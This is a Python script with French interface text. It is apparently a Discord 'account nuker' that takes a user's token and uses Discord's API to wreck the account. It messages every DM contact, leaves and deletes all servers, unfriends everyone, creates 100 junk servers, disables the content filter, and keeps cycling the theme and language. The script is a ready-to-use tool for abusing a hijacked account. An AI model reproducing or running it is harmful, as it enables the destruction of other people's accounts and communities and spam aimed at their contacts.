import os
import sys
import requests
import threading
import random
from itertools import cycle
from pystyle import Colors

def setTitle(title):
    os.system(f"title {title}")

def accnuke():
    def nuke(usertoken, nom_serveur, message_a_envoyer):
        if threading.active_count() <= 100:
            t = threading.Thread(target=mode_crise, args=(usertoken,))
            t.start()

        headers = {'Authorization': usertoken}


        channel_ids = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers).json()
        print(f"\nMessage envoyé à tous les amis disponibles")
        for channel in channel_ids:
            try:
                requests.post(f"https://discord.com/api/v9/channels/{channel['id']}/messages",
                              headers=headers,
                              data={"content": f"{message_a_envoyer}"})
                print(f"\tMessage envoyé à l'ID: {channel['id']}")
            except Exception as e:
                print(f"\tErreur rencontrée (ignorée) : {e}")

        print(f"\nQuitte tous les serveurs disponibles")
        guild_ids = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers).json()
        for guild in guild_ids:
            try:
                requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild['id']}", headers=headers)
                print(f"\tServeur quitté : {guild['name']}")
            except Exception as e:
                print(f"\tErreur rencontrée (ignorée) : {e}")


        print(f"\nSupprime tous les serveurs disponibles")
        for guild in guild_ids:
            try:
                requests.delete(f"https://discord.com/api/v9/guilds/{guild['id']}", headers=headers)
                print(f'\tServeur supprimé : {guild["name"]}')
            except Exception as e:
                print(f"\tErreur rencontrée (ignorée) : {e}")


        print(f"\nSupprime tous les amis disponibles")
        friend_ids = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=headers).json()
        for friend in friend_ids:
            try:
                requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{friend['id']}", headers=headers)
                print(f"\tAmi supprimé : {friend['user']['username']}#{friend['user']['discriminator']}")
            except Exception as e:
                print(f"\tErreur rencontrée (ignorée) : {e}")


        print(f"\nCréation de nouveaux serveurs")
        for i in range(100):
            try:
                payload = {'name': f'{nom_serveur}', 'region': 'europe', 'icon': None, 'channels': []}
                response = requests.post('https://discord.com/api/v9/guilds', headers=headers, json=payload)
                if response.status_code == 201:
                    print(f"\tServeur créé : {nom_serveur} #{i}")
                else:
                    print(f"\tÉchec de la création du serveur {nom_serveur} #{i} : {response.text}")
            except Exception as e:
                print(f"\tErreur rencontrée (ignorée) : {e}")


        t.do_run = False
        settings = {
            'theme': "light",
            'locale': "ja",
            'message_display_compact': False,
            'inline_embed_media': False,
            'inline_attachment_media': False,
            'gif_auto_play': False,
            'render_embeds': False,
            'render_reactions': False,
            'animate_emoji': False,
            'convert_emoticons': False,
            'enable_tts_command': False,
            'explicit_content_filter': '0',
            'status': "idle"
        }
        requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=settings)
        user_data = requests.get("https://discordapp.com/api/v9/users/@me", headers=headers).json()
        username = user_data['username'] + "#" + user_data['discriminator']
        print(f"\n{username} a été transformé en troll avec succès")
        input(f"\nAppuyez sur ENTRÉE pour quitter")

    def mode_crise(token):
        print(f'Activation du mode crise (Changement de thème entre clair et sombre)')
        t = threading.currentThread()
        while getattr(t, "do_run", True):
            modes = cycle(["light", "dark"])
            settings = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
            requests.patch("https://discord.com/api/v9/users/@me/settings", headers={'Authorization': usertoken}, json=settings)

    nom_serveur = str(input(f'{Colors.red} Entrez le nom des serveurs à créer : '))
    message_a_envoyer = str(input(f'{Colors.red} Message à envoyer à chaque ami : '))
    response = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': usertoken})
    threads = 100

    if threading.active_count() < threads:
        threading.Thread(target=nuke, args=(usertoken, nom_serveur, message_a_envoyer)).start()
        return

def run():
    global usertoken
    usertoken = str(input(f"{Colors.red}Token : "))
    accnuke()

if __name__ == "__main__":
    run()
